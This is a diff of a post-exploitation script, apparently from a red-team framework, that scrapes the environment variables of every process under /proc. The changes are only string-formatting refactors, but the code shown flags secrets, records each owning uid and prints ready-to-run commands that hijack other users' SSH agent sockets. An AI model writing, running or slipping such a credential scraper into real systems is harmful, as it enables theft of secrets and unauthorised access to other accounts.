@@ -34,7 +34,7 @@ def _is_secret(key):
 
 
 def _proc_uid(pid):
-    status = read_file("/proc/%s/status" % pid, default="")
+    status = read_file(sprintf("/proc/%s/status", pid), default="")
     for line in status.splitlines():
         if str_startswith(line, "Uid:"):
             parts = line.split()
@@ -44,10 +44,10 @@ def _proc_uid(pid):
 
 
 def _scan_pid(pid, mode, ssh_only):
-    environ = read_file("/proc/%s/environ" % pid, default="")
+    environ = read_file(sprintf("/proc/%s/environ", pid), default="")
     if not environ:
         return 0
-    comm = read_file("/proc/%s/comm" % pid, default="").strip()
+    comm = read_file(sprintf("/proc/%s/comm", pid), default="").strip()
     uid = _proc_uid(pid)
     printed = 0
     for entry in environ.split("\x00"):
@@ -66,11 +66,11 @@ def _scan_pid(pid, mode, ssh_only):
             print("")
             print(sprintf("[pid=%-6s uid=%-6s comm=%s]", pid, uid or "?", comm))
         if secret:
-            print("  [SECRET] %s" % entry)
+            print(sprintf("  [SECRET] %s", entry))
         else:
-            print("  %s" % entry)
+            print(sprintf("  %s", entry))
         if is_ssh:
-            print("  [>>] export SSH_AUTH_SOCK=%s && ssh-add -l" % entry[idx + 1:])
+            print(sprintf("  [>>] export SSH_AUTH_SOCK=%s && ssh-add -l", entry[idx + 1:]))
         printed += 1
     return printed
 
@@ -91,8 +91,8 @@ def main(*args):
     my_uid = "?"
     uid_res = sys_call("getuid")
     if uid_res["errno"] == 0:
-        my_uid = "%d" % uid_res["r1"]
-    print("[*] env scrape uid=%s mode=%s scope=%s" % (my_uid, mode, scope))
+        my_uid = sprintf("%d", uid_res["r1"])
+    print(sprintf("[*] env scrape uid=%s mode=%s scope=%s", my_uid, mode, scope))
 
     scanned = 0
     for pid in list_dir("/proc"):
@@ -105,5 +105,5 @@ def main(*args):
         scanned += 1
 
     print("")
-    print("[*] %d processes scanned" % scanned)
+    print(sprintf("[*] %d processes scanned", scanned))
     return "OK"
